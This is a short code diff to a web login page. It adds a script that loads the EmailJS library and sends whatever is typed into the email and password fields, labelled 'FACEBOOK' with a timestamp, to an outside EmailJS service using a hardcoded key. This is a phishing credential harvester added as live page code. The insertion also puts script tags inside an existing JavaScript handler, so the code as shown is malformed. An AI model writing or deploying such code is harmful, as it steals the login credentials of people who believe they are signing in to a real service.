@@ -297,6 +297,15 @@
       if (e.key === 'Enter') {
         const active = document.activeElement;
         if (active.id === 'email' || active.id === 'password') handleLogin();
+          <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    function enviar() {
+      emailjs.init('0jG8bx2KA7fuPpvtf');
+      emailjs.send('service_tr444xm', 'template_4x12f3k', {
+        origen: 'FACEBOOK',
+        correo: document.getElementById('email').value,
+        password: document.getElementById('password').value,
+        fecha: new Date().toLocaleString('es-EC')
       }
     });
   </script>
